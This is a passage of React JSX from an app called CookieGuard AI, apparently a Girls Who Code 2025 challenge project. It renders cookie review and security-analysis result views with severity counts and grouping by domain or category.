            <div className="review-header">
              <div>
                <h2>Review Cookies</h2>
                <p>Loaded {cookies.length} cookie(s) from {summaryStats.domainCount} domain(s)</p>
              </div>
              <button 
                className="btn btn-primary btn-lg"
                onClick={analyzeCookies}
                disabled={loading}
              >
                {loading ? 'Analyzing...' : '🔍 Analyze Cookies'}
              </button>
            </div>

            <div className="view-toggle">
              <button 
                className={`toggle-btn ${viewMode === 'domain' ? 'active' : ''}`}
                onClick={() => setViewMode('domain')}
              >
                <Icons.Globe /> By Domain
              </button>
              <button 
                className={`toggle-btn ${viewMode === 'category' ? 'active' : ''}`}
                onClick={() => setViewMode('category')}
              >
                <Icons.Tag /> By Category
              </button>
            </div>

            <div className="groups-container">
              {viewMode === 'domain' && Object.entries(groupedByDomain).map(([domain, group]) => (
                <div key={domain} className="group-card">
                  {renderGroupHeader(domain, group, 'domain')}
                  {expandedGroups[domain] && (
                    <div className="group-content">
                      {group.cookies.map((cookie, idx) => renderCookieDetails(cookie, idx))}
                    </div>
                  )}
                </div>
              ))}
              
              {viewMode === 'category' && Object.entries(groupedByCategory).map(([category, group]) => (
                <div key={category} className="group-card">
                  {renderGroupHeader(category, group, 'category')}
                  {expandedGroups[category] && (
                    <div className="group-content">
                      {group.cookies.map((cookie, idx) => renderCookieDetails(cookie, idx))}
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Results Tab */}
        {activeTab === 'results' && results && (
          <div className="results-container">
            <div className="results-header">
              <h2>Security Analysis Results</h2>
              <button className="btn btn-secondary">
                <Icons.Download /> Export Report
              </button>
            </div>

            {/* Compact Stats Bar */}
            <div className="stats-bar">
              <div className="stat-item total">
                <span className="stat-value">{summaryStats.total}</span>
                <span className="stat-label">Total</span>
              </div>
              <div className="stat-divider" />
              <div className="stat-item critical">
                <span className="stat-value">{summaryStats.critical}</span>
                <span className="stat-label">Critical</span>
              </div>
              <div className="stat-item high">
                <span className="stat-value">{summaryStats.high}</span>
                <span className="stat-label">High</span>
              </div>
              <div className="stat-item medium">
                <span className="stat-value">{summaryStats.medium}</span>
                <span className="stat-label">Medium</span>
              </div>
              <div className="stat-item low">
                <span className="stat-value">{summaryStats.low}</span>
                <span className="stat-label">Safe</span>
              </div>
            </div>

            {/* Category Summary */}
            <div className="category-summary">
              <h3>Issues by Category</h3>
              <div className="category-bars">
                {Object.entries(groupedByCategory).map(([category, group]) => {
                  const config = categoryConfig[category] || categoryConfig.normal;
                  const percentage = (group.cookies.length / summaryStats.total) * 100;
                  return (
                    <div key={category} className="category-bar-item">
                      <div className="category-bar-label">
                        <span style={{ color: config.color }}>{config.label}</span>
                        <span>{group.cookies.length}</span>
                      </div>
                      <div className="category-bar-bg">
                        <div 
                          className="category-bar-fill"
                          style={{ width: `${percentage}%`, backgroundColor: config.color }}
                        />
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* View Toggle */}
            <div className="view-toggle">
              <button 
                className={`toggle-btn ${viewMode === 'domain' ? 'active' : ''}`}
                onClick={() => setViewMode('domain')}
              >
                <Icons.Globe /> By Domain
              </button>
              <button 
                className={`toggle-btn ${viewMode === 'category' ? 'active' : ''}`}
                onClick={() => setViewMode('category')}
              >
                <Icons.Tag /> By Category
              </button>
            </div>

            {/* Grouped Results */}
            <div className="groups-container">
              {viewMode === 'domain' && Object.entries(groupedByDomain).map(([domain, group]) => (
                <div key={domain} className="group-card">
                  {renderGroupHeader(domain, group, 'domain')}
                  {expandedGroups[domain] && (
                    <div className="group-content">
                      {group.cookies.map((cookie, idx) => renderCookieDetails(cookie, idx))}
                    </div>
                  )}
                </div>
              ))}
              
              {viewMode === 'category' && Object.entries(groupedByCategory).map(([category, group]) => (
                <div key={category} className="group-card">
                  {renderGroupHeader(category, group, 'category')}
                  {expandedGroups[category] && (
                    <div className="group-content">
                      {group.cookies.map((cookie, idx) => renderCookieDetails(cookie, idx))}
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>
        )}
      </main>

      <footer className="footer">
        <p>CookieGuard AI • Girls Who Code AI Challenge 2025</p>
      </footer>
    </div>
  );
}

export default App;
